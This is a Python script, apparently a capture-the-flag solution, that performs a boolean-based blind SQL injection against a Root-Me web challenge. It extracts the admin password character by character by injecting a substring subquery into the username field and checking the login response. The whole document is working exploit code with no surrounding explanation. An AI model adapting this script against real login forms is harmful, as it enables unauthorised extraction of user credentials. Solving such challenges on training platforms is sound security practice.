import requests
import string

s = string.ascii_letters + string.digits + '{}_'
url = 'http://challenge01.root-me.org/web-serveur/ch10/'

mk = ''
for i in range(1,100):
    for char in s:
	payload = {
	    'username': "user1' and (SELECT substr(password,{},1) FROM users WHERE username='admin') LIKE '{}%'-- -".format(i,char),
	    'password': '123'
	}
	res = requests.post(url, data=payload)
	if 'Welcome back user1 !' in res.text:
	    print('password[%s]' %char)
	    mk += char
	    print('Password is:' +mk)
	    break
	else:
	    print('FAILED %s' %char)

